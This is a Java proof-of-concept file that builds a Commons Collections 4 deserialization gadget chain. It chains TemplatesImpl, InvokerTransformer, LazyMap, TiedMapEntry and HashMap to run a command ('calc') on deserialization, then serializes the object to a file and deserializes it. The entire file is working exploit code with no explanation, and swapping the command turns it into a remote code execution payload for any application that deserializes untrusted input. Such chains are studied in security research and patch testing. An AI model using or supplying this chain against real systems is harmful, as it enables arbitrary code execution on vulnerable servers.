package Seri;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.util.HashMap;
import java.util.Map;

public class CC4CCGadgets6 {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = Utils.createTemplatesImpl("calc");

        Transformer transformer = new InvokerTransformer(
                "useServicesMechnism" ,
                null ,null
        );

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.lazyMap(innerMap ,transformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap ,templates);

        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry ,"xxx");

        outerMap.clear();

        Utils.setValue(transformer ,"iMethodName" ,"newTransformer");

        System.out.println(Utils.serialize(hashMap ,"bin/CC4CCGadgets6.bin"));
        Utils.unserialize("bin/CC4CCGadgets6.bin");
    }
}
